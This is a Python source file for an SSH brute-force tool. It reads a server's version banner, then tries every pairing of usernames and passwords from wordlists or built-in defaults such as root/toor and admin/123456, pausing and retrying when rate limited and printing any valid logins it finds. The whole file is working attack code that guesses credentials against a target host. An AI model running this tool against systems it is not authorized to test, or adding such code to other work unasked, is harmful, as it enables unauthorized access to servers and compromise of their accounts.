"""SSH brute force extractor — fingerprints SSH server and tests credentials from wordlists."""

import itertools
import os
import socket

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Fallback credentials if wordlists are not found
FALLBACK_USERNAMES = ['root', 'admin', 'user', 'ubuntu', 'cpanel', 'webmaster']
FALLBACK_PASSWORDS = ['', 'root', 'admin', 'password', '123456', 'toor']


class SSHExtractor:
    """Fingerprints SSH server version and attempts login with credentials from wordlists."""

    def __init__(self, ip: str, port: int = 22):
        """Initialize with target IP and port.

        Args:
            ip (str): Target IP address.
            port (int): SSH port, default 22.
        """
        self.ip = ip
        self.port = port

    def run(self):
        """Connect to SSH, read banner, then test credentials from wordlists.

        Returns:
            dict: SSH version, credential results, and any successful logins.
        """
        print(f"  [SSH] Connecting to {self.ip}:{self.port}")
        result = {'status': 'open', 'version': 'unknown', 'credentials': []}

        version = self._get_banner()
        result['version'] = version
        print(f"  [SSH] Version: {version}")

        if not self._has_paramiko():
            print(f"  [SSH] paramiko not installed — run: pip install paramiko")
            result['status'] = 'no_paramiko'
            return result

        credentials = self._load_credentials()
        print(f"  [SSH] Testing {len(credentials)} combinations...")

        for username, password in credentials:
            status = self._test_credential(username, password)
            display = f"{username}:{password if password else '(empty)'}"
            if status == 'success':
                print(f"  [SSH] *** VALID CREDENTIAL FOUND: {display} ***")
                result['credentials'].append({'user': username, 'password': password, 'status': 'valid'})
            elif status == 'auth_failed':
                print(f"  [SSH] Invalid: {display}")
            else:
                print(f"  [SSH] Error testing {display}: {status}")

        return result

    def _load_credentials(self) -> list:
        """Load usernames and passwords from wordlist files and return all combinations.

        Looks for any .txt file in the wordlists/ directory.
        Expects at least one file with 'user' in the name and one with 'pass' in the name.
        Falls back to built-in defaults if files are not found.

        Returns:
            list: List of (username, password) tuples.
        """
        wordlists_path = os.path.join(BASE_DIR, '..', '..', '..', 'wordlists')
        usernames = self._load_wordlist(wordlists_path, 'user', FALLBACK_USERNAMES)
        passwords = self._load_wordlist(wordlists_path, 'pass', FALLBACK_PASSWORDS)
        return list(itertools.product(usernames, passwords))

    def _load_wordlist(self, directory: str, keyword: str, fallback: list) -> list:
        """Find and load a wordlist file whose name contains the given keyword.

        Args:
            directory (str): Path to wordlists directory.
            keyword (str): Keyword to match in filename (e.g. 'user', 'pass').
            fallback (list): Default list to use if no matching file is found.

        Returns:
            list: Lines from the matched file, or fallback list.
        """
        try:
            for filename in os.listdir(directory):
                if keyword.lower() in filename.lower() and filename.endswith('.txt'):
                    filepath = os.path.join(directory, filename)
                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                        lines = [line.strip() for line in f if line.strip()]
                    print(f"  [SSH] Loaded {len(lines)} entries from {filename}")
                    return lines
        except FileNotFoundError:
            pass
        print(f"  [SSH] No wordlist found for '{keyword}' — using fallback ({len(fallback)} entries)")
        return fallback

    def _get_banner(self) -> str:
        """Read the SSH version banner via raw TCP connection.

        Returns:
            str: SSH version string or 'unknown'.
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((self.ip, self.port))
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            return banner
        except Exception as e:
            return f'unknown ({e})'

    def _has_paramiko(self) -> bool:
        """Check if paramiko is available for SSH authentication.

        Returns:
            bool: True if paramiko can be imported.
        """
        try:
            import paramiko
            return True
        except ImportError:
            return False

    def _test_credential(self, username: str, password: str) -> str:
        """Attempt SSH login with given credentials using paramiko.
        Retries once after 10 seconds on connection failure.

        Args:
            username (str): SSH username to test.
            password (str): Password to test.

        Returns:
            str: 'success', 'auth_failed', or error message string.
        """
        import paramiko
        import time
        time.sleep(1.5)

        for attempt in range(2):
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(
                    hostname=self.ip,
                    port=self.port,
                    username=username,
                    password=password,
                    timeout=5,
                    allow_agent=False,
                    look_for_keys=False,
                )
                client.close()
                return 'success'
            except paramiko.AuthenticationException:
                return 'auth_failed'
            except paramiko.ssh_exception.NoValidConnectionsError:
                if attempt == 0:
                    print(f"  [SSH] Rate limited — waiting 10s before retry...")
                    time.sleep(10)
                else:
                    return 'no_connection'
            except Exception as e:
                return str(e)
        return 'no_connection'
